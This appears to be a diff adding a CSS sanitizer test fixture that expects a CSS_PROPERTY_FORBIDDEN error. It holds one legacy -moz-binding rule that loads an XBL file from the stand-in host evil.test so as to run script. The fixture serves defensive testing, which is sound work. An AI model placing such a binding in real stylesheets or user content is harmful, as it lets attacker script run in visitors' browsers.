@@ -1,0 +1,5 @@
+/* expect: CSS_PROPERTY_FORBIDDEN
+   Legacy XBL bindings run script. */
+.a {
+  -moz-binding: url("https://evil.test/xbl.xml#x");
+}
